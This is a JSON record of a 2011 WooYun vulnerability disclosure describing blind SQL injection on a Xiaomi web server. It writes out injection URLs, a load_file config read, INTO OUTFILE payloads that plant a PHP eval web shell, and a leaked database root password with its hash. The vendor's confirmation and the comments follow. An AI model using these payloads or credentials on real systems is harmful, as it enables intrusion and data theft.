{"id": 21617, "wybug_id": "wooyun-2011-03473", "wybug_title": "小米科技网站盲注", "wybug_corp": "小米科技", "wybug_author": "Jannock", "wybug_date": "2011-11-29 22:15", "wybug_open_date": "2011-12-29 22:16", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射", "安全意识不足", "注射", "权限设置不当", "文件读取", "黑盒分析技巧", "注射技巧", "数据库密码泄漏"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2011-11-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2011-11-29：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2011-12-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2011-12-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2011-12-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2011-12-29：\t细节向公众公开  简要描述： 小米科技网站盲注，并root权限，成功导出shell。 详细说明：  (注：本人只拿Shell那步，没继续往下。shell我删了。留下 http://fx.xiaomi.net/miniphp/cache/template/2.php)盲注点：http://fx.xiaomi.net/main.php?uid=2805&type=pic&status=1参数status。经测试为 root 权限。猜解取得：root  *A31FBAA1D88E2E4DB2BDA249CC49CB4B4F5BFA1A暴路径BUG：http://fx.xiaomi.net/main.php?uid=2805&type=pic&status=1&act=sharexNotice: Undefined variable: pageCount in /opt/www/sj.xiaomi.com/miniphp/cache/template/8bb2e0a169ed573c81291c5b912aa2f1.php on line 165 Notice: Undefined variable: pageno in /opt/www/sj.xiaomi.com/miniphp/cache/template/8bb2e0a169ed573c81291c5b912aa2f1.php on line 165 可load_file /opt/www/sj.xiaomi.com/miniphp/config.inc.php 但后发现居然GPC为OFF，可直接导出Shellhttp://fx.xiaomi.net/main.php?uid=2805&type=pic&status=1 limit 0,1 INTO OUTFILE '/opt/www/sj.xiaomi.com/miniphp/cache/template/2.php' LINES TERMINATED BY '<?php phpinfo();?>'%23地址：http://fx.xiaomi.net/miniphp/cache/template/2.phphttp://fx.xiaomi.net/main.php?uid=2805&type=pic&status=1 limit 0,1 INTO OUTFILE '/opt/www/sj.xiaomi.com/miniphp/cache/template/3.php' LINES TERMINATED BY '<?php  eval($_POST[c]);?>'%23http://fx.xiaomi.net/miniphp/cache/template/3.php  一句话密码为 c   漏洞证明：  \n\n    define('DB_HOST', 'localhost');    define('DB_USER', 'root');    define('DB_PASS', '3487e498770b9740086144fc03140876');mysql> select password('3487e498770b9740086144fc03140876');+----------------------------------------------+| password('3487e498770b9740086144fc03140876') |+----------------------------------------------+| *A31FBAA1D88E2E4DB2BDA249CC49CB4B4F5BFA1A    |+----------------------------------------------+1 row in set (0.00 sec)和猜解的一样。   修复方案：  您懂得   版权声明：转载请注明来源 Jannock@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2011-11-29 22:35 厂商回复： 谢谢报告，内部处理中 最新状态： 2011-11-30：这个不再维护的历史产品，单独的服务器。昨夜已经停止域名解析并关机不再维护了。但是要非常非常感谢Jannock的报告，给我们上了一堂生动的课！  ", "replys": "漏洞评价：\n评论\n     2011-11-29 23:27 |    \t\t无敌L.t.H \t\t\t( 路人 |\t\t\t        Rank:21 漏洞数:4        | ‮……肉肉捉活，亭长放解)\t\t \n  雷军竟然用root    \n     2011-11-30 16:52 |    \t\t Jesus \t\t\t( 实习白帽子  |\t\t\t        Rank:60 漏洞数:18        | 天地不仁,以万物为刍狗！)\t\t \n  funny    \n     2011-11-30 17:00 |    \t\tmolice \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:1        | 蛋蛋的香气)\t\t \n  雷军很雷    \n     2011-12-29 23:21 |    \t\t歌颂 \t\t\t( 实习白帽子  |\t\t\t        Rank:36 漏洞数:5        | #1024)\t\t \n  果然很雷    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}